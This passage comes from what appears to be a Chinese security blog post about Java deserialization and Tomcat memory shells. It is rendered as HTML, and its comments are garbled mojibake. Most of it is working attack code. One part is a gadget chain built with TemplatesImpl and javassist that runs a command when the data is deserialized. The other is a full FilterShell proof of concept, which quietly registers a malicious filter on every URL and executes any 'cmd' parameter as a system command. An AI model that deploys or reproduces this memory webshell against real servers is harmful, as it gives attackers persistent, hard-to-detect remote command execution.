class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å†™å…¥.class æ–‡ä»¶</span></span><br><span class="line">        <span class="comment">// å°†æˆ‘çš„æ¶æ„ç±»è½¬æˆå­—èŠ‚ç ï¼Œå¹¶ä¸”åå°„è®¾ç½® bytecodes</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,targetByteCodes);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;asdfasdfasdf&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,templates);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) f.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f3.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc11&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc11&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102161904207.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102161904207.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="ååºåˆ—åŒ–æ³¨å…¥"><a href="#ååºåˆ—åŒ–æ³¨å…¥" class="headerlink" title="ååºåˆ—åŒ–æ³¨å…¥"></a>ååºåˆ—åŒ–æ³¨å…¥</h3><p>ä¸Šæ–‡çš„æ³¨å…¥ç‚¹ä½äºorg.apache.catalina.core.ApplicationFilterChain.internalDoFilter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130853915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130853915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯åœ¨setä¹‹å‰æ‰§è¡Œäº†doFilterï¼Œå°±æ‰§è¡Œå®Œäº†æ‰€æœ‰çš„Filterï¼Œè€Œshiroååºåˆ—åŒ–å…¥å£rememberMeçš„åŠŸèƒ½å…¶å®æ˜¯ShiroFilterçš„ä¸€ä¸ªæ¨¡å—ã€‚æ‰€ä»¥è¯¥æ–¹æ³•ä¸èƒ½ç”¨æ¥æ‰“shiro</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230104162826477.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230104162826477.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥ä¸ºäº†æ‰“shiroè¿™ç§éœ€è¦filterçš„ç¯å¢ƒï¼Œå°±éœ€è¦åŠ¨æ€æ³¨å†Œæ¶æ„Filter</p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªç»§æ‰¿AbstractTransletçš„ç±»TomcatEchoInjectï¼Œå› ä¸ºè¦ç”¨åˆ°å­—èŠ‚ç ã€‚æŒ‰ç…§Tomcatå›æ˜¾çš„æ­¥éª¤ï¼Œå°†WRAP_SAME_OBJECTè®¾ç½®ä¸ºtrueï¼Œå¹¶å°†lastServicedRequestå’ŒlastServicedResponseåˆå§‹åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">           <span class="comment">//ä¿®æ”¹static final</span></span><br><span class="line">           setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">           setFinalStatic(lastServicedRequestField);</span><br><span class="line">           setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">           <span class="comment">//é™æ€å˜é‡ç›´æ¥å¡«nullå³å¯</span></span><br><span class="line">           ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">           ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">               WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">               lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">               lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šæ–‡jspç‰ˆçš„å†…å­˜é©¬ä¸­ï¼Œæ˜¯é€šè¿‡requestè·å–åˆ°çš„servletä¸Šä¸‹æ–‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œrequestå­˜å…¥åˆ°äº†lastServicedRequestï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è·å–servletContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å–å‡ºrequeståï¼Œé€šè¿‡addFilterMapBeforeæ·»åŠ åˆ°filterçš„æœ€å‰é¢ï¼Œè¿™é‡Œç›´æ¥ç”¨å¤©ä¸‹å¤§æœ¨å¤´å¸ˆå‚…çš„ä»£ç äº†ã€‚</p><p>åå°„è·å–filterConfigsï¼Œç”¨filterConfigsæ¥å¯åŠ¨filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> memoryshell.UnserShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä¿®æ”¹static final</span></span><br><span class="line">            setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">            setFinalStatic(lastServicedRequestField);</span><br><span class="line">            setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//é™æ€å˜é‡ç›´æ¥å¡«nullå³å¯</span></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">                <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//å¼€å§‹æ³¨å…¥å†…å­˜é©¬</span></span><br><span class="line">                <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// ApplicationContext ä¸º ServletContext çš„å®ç°ç±»</span></span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// è¿™æ ·æˆ‘ä»¬å°±è·å–åˆ°äº† context</span></span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//1ã€åˆ›å»ºæ¶æ„filterç±»</span></span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterShell</span>();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//2ã€åˆ›å»ºä¸€ä¸ªFilterDef ç„¶åè®¾ç½®filterDefçš„åå­—ï¼Œå’Œç±»åï¼Œä»¥åŠç±»</span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                filterDef.setFilterName(<span class="string">&quot;Sentiment&quot;</span>);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è°ƒç”¨ addFilterDef æ–¹æ³•å°† filterDef æ·»åŠ åˆ° filterDefsä¸­</span></span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line">                <span class="comment">//3ã€å°†FilterDefs æ·»åŠ åˆ°FilterConfig</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">                Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">                constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">                filterConfigs.put(<span class="string">&quot;Sentiment&quot;</span>,filterConfig);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//4ã€åˆ›å»ºä¸€ä¸ªfilterMap</span></span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">                filterMap.setFilterName(<span class="string">&quot;Sentiment&quot;</span>);</span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">                <span class="comment">//å°†è‡ªå®šä¹‰çš„filteræ”¾åˆ°æœ€å‰è¾¹æ‰§è¡Œ</span></span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">                servletResponse.getWriter().write(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//String[] cmds = &#123;&quot;/bin/sh&quot;,&quot;-c&quot;,request.getParameter(&quot;cmd&quot;)&#125;</span></span><br><span class="line">            String[] cmds = &#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">byte</span>[] bcache = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">readSize</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">ByteArrayOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>()) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((readSize = in.read(bcache)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    outputStream.write(bcache, <span class="number">0</span>, readSize);</span><br><span class="line">                &#125;</span><br><span class="line">                response.getWriter().println(outputStream.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> 